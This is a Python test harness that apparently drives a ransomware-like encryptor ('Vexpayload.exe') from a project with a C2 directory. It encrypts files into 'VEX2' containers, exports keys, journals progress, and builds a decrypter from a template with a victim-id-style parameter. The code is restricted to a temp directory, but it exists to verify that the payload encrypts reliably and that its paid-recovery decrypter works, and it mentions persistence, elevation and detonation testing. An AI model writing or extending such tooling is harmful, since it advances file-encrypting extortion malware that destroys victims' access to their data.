#!/usr/bin/env python3
"""Recovery drill for the real payload harness (no elevation, temp dir only).

Requires VEX_ALLOW_PAYLOAD=1. It does NOT touch ProgramData, persistence, the
network, or any non-temp path. It proves:
  * chunked encrypt + journal write + key export round-trip
  * torn journal tail is trimmed on the next harness run
  * a second run with a different key-out still queues new files safely

This is a harness test, not a substitute for the VM detonation/pardon matrix.
"""
import base64
import os
import shutil
import subprocess
import sys
import tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "VexC2"))
import crypto_util  # noqa: E402

EXE = os.path.join(ROOT, "x64", "Release", "Vexpayload.exe")
CHECKS = []


def ok(name, cond, extra=""):
    CHECKS.append((name, bool(cond)))
    print(("PASS " if cond else "FAIL ") + name + ((" " + str(extra)) if extra else ""))


def run(root, journal, keyout):
    return subprocess.run(
        [EXE, "--encrypt", root, "--journal", journal, "--key-out", keyout,
         "--no-elevate"], capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=180)


def main() -> int:
    if os.environ.get("VEX_ALLOW_PAYLOAD") != "1":
        print("[skip] set VEX_ALLOW_PAYLOAD=1 to run the harness drill")
        return 0
    if not os.path.exists(EXE):
        print(f"[!] missing {EXE}; build first")
        return 2
    base = tempfile.mkdtemp(prefix="vex_recovery_")
    root = os.path.join(base, "v\u00ebx_\u6e2c\u8a66")
    os.makedirs(root, exist_ok=True)
    try:
        a = os.path.join(root, "\u03b1lpha.txt")
        b = os.path.join(root, "beta.bin")
        open(a, "wb").write(b"alpha-recovery-" * 20000)
        open(b, "wb").write(os.urandom(12000))
        # Unsupported metadata must be skipped, never half-encrypted.
        ads = os.path.join(root, "ads.txt")
        open(ads, "wb").write(b"ads-plain")
        try:
            with open(ads + ":Zone.Identifier", "w", encoding="ascii") as af:
                af.write("[ZoneTransfer]\r\nZoneId=3\r\n")
            ads_ok = True
        except OSError:
            ads_ok = False
        hard = os.path.join(root, "hard.txt")
        hard2 = os.path.join(root, "hard2.txt")
        open(hard, "wb").write(b"hardlink-plain")
        try:
            os.link(hard, hard2)
            hard_ok = True
        except OSError:
            hard_ok = False
        journal = os.path.join(root, "recovery.jnl")
        keyout = os.path.join(root, "key.txt")
        r = run(root, journal, keyout)
        ok("encrypt harness rc", r.returncode == 0, r.stdout[-200:])
        key = base64.b64decode(open(keyout).read().strip())
        for path in (a, b):
            blob = open(path, "rb").read()
            ok(f"{os.path.basename(path)} VEX2", blob[:4] == b"VEX2")
            try:
                plain = crypto_util.decrypt_container(blob, key)
                ok(f"{os.path.basename(path)} decrypts", bool(plain))
            except Exception as exc:
                ok(f"{os.path.basename(path)} decrypts", False, exc)
        ok("journal header", open(journal, "rb").read(4) == b"VXJ2")
        ok("journal HMAC sidecar", os.path.exists(journal + ".sig"))
        ok("ADS file skipped", not ads_ok or open(ads, "rb").read(4) != b"VEX2")
        ok("hardlink skipped", not hard_ok or open(hard, "rb").read(4) != b"VEX2")
        # Failure contract: an unopenable journal must return non-zero and must
        # not pretend the file was encrypted.
        failroot = os.path.join(base, "fail")
        os.makedirs(failroot, exist_ok=True)
        fpath = os.path.join(failroot, "keep.txt")
        open(fpath, "wb").write(b"do-not-encrypt")
        bad_journal = os.path.join(failroot, "journal_dir")
        os.makedirs(bad_journal, exist_ok=True)
        fail = run(failroot, bad_journal, os.path.join(base, "fail.key"))
        ok("engine failure returns non-zero", fail.returncode != 0)
        ok("engine failure leaves plaintext",
           open(fpath, "rb").read(4) != b"VEX2")
        # Build the real decrypter and prove a tampered journal is rejected.
        try:
            import decrypter_build
            os.environ["VEX_BUILD_CACHE"] = os.path.join(root, "build_cache")
            dec = decrypter_build.build(
                os.path.join(ROOT, "VexC2", "decrypter_template.cpp"),
                open(keyout, "r", encoding="ascii").read().strip(), vid="")
        except Exception:
            dec = None
        if dec:
            good = subprocess.run(
                [dec, "--journal", journal, "--key",
                 open(keyout, "r", encoding="ascii").read().strip(),
                 "--check", "--no-elevate"], capture_output=True, text=True, encoding="utf-8", errors="replace",
                timeout=120)
            ok("sealed journal accepted", good.returncode == 0,
               (good.stdout or "")[-160:])
            bad_j = os.path.join(root, "tampered.jnl")
            raw = bytearray(open(journal, "rb").read())
            raw[-1] ^= 0x01
            with open(bad_j, "wb") as bf:
                bf.write(raw)
            shutil.copy2(journal + ".sig", bad_j + ".sig")
            bad = subprocess.run(
                [dec, "--journal", bad_j, "--key",
                 open(keyout, "r", encoding="ascii").read().strip(),
                 "--check", "--no-elevate"], capture_output=True, text=True, encoding="utf-8", errors="replace",
                timeout=120)
            ok("tampered journal rejected", bad.returncode != 0,
               (bad.stdout or "")[-160:])
        else:
            ok("decrypter build for journal test", False, "compiler unavailable")
        before = os.path.getsize(journal)
        with open(journal, "ab") as fh:
            fh.write(b"TORN-TAIL" * 9)
        c = os.path.join(root, "gamma.txt")
        open(c, "wb").write(b"gamma-" * 5000)
        key2 = os.path.join(root, "key2.txt")
        r = run(root, journal, key2)
        ok("second harness rc", r.returncode == 0, r.stdout[-200:])
        ok("torn tail trimmed", b"TORN-TAIL" not in open(journal, "rb").read())
        ok("journal grew", os.path.getsize(journal) > before)
        k2 = base64.b64decode(open(key2).read().strip())
        ok("gamma decrypts", bool(crypto_util.decrypt_container(
            open(c, "rb").read(), k2)))
    finally:
        shutil.rmtree(base, ignore_errors=True)
    bad = [n for n, s in CHECKS if not s]
    print(f"\n{len(CHECKS) - len(bad)}/{len(CHECKS)} checks passed")
    return 0 if CHECKS and not bad else 1


if __name__ == "__main__":
    sys.exit(main())
